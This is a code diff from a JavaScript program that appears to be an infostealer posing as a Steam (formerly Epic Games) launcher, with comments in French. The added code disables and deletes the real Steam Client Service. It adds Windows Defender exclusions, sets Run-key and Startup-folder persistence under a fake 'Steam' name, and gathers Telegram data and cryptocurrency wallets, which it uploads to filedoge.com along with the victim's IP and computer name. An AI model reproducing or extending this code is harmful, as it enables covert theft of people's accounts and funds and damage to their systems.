@@ -224,11 +224,6 @@ function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
 
-
-const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
-const keyName = 'EpicGamesLauncher';
-    
-
 async function execAsync(command) {
     try {
         const { stdout, stderr } = await exec(command);
@@ -243,26 +238,63 @@ async function execAsync(command) {
     }
 }
 
+
+const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
+const keyName = 'Steam';
+
 function removeRegistryKey() {
-  const command = `reg delete "${registryPath}" /v ${keyName} /f`;
+    const command = `reg delete "${registryPath}" /v ${keyName} /f`;
 
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      const errorMessage = `Error removing registry key: ${error.message}`;
-      console.error(errorMessage);
-      return;
-    }
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            const errorMessage = `Erreur lors de la suppression de la clé de registre : ${error.message}`;
+            console.error(errorMessage);
+            return;
+        }
 
-    if (stderr) {
-      const errorMessage = `CMD error: ${stderr}`;
-      console.error(errorMessage);
-      return;
-    }
+        if (stderr) {
+            const errorMessage = `Erreur CMD : ${stderr}`;
+            console.error(errorMessage);
+            return;
+        }
 
-    console.log(`Registry key removed successfully: ${stdout}`);
-  });
+        // Vérifier si la clé a été supprimée avec succès
+        if (stdout.includes('La clé spécifiée n’existe pas.')) {
+            console.log(`La clé de registre "${keyName}" n'existait pas.`);
+        } else {
+            console.log(`La clé de registre "${keyName}" a été supprimée avec succès.`);
+            // Désactiver totalement le service Steam Client Service
+            exec('sc config "Steam Client Service" start=disabled', (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Erreur lors de la désactivation du service : ${error.message}`);
+                    return;
+                }
+
+                if (stderr) {
+                    console.error(`Erreur CMD : ${stderr}`);
+                    return;
+                }
+
+                console.log(`Service Steam Client désactivé : ${stdout}`);
+
+                // Supprimer le service Steam Client Service
+                exec('sc delete "Steam Client Service"', (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`Erreur lors de la suppression du service : ${error.message}`);
+                        return;
+                    }
+
+                    if (stderr) {
+                        console.error(`Erreur CMD : ${stderr}`);
+                        return;
+                    }
+
+                    console.log(`Service Steam Client supprimé : ${stdout}`);
+                });
+            });
+        }
+    });
 }
-
 /* basic startup
 function addRegistryKey() {
   const programPath = app.getPath('exe');
@@ -801,16 +833,16 @@ function createRunBat() {
     
 
     const app1Path = `"${app.getPath('exe')}"`;
-    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\EpicGames_Service.exe"';
+    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
     const batContent = `@echo off
 
 powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows"
 REM Add registry key
-reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher" /t REG_SZ /d ${app1Path} /f
+reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam" /t REG_SZ /d ${app1Path} /f
 
 REM Display registry value
-reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "EpicGamesLauncher"
+reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam"
 
 REM Verify if App1 is already installed
 if not exist ${app1Path} (
@@ -2648,7 +2680,7 @@ async function getExtension(zipFilePath) {
     const foundFoldersTele = await checkFolderstele(mainFolderPath);
     const foundWalletsTele = await checkWalletstele(mainFolderPath);
 
-    const destinationFolder = 'C:\\ProgramData\\Epic\\Launcher';
+    const destinationFolder = 'C:\\ProgramData\\Steam\\Launcher';
     const token = await uploadToDoge(destinationFolder, locale, computerName);
     const downloadLink = `https://api.filedoge.com/download/${token}`;
     const ip = await getIp();
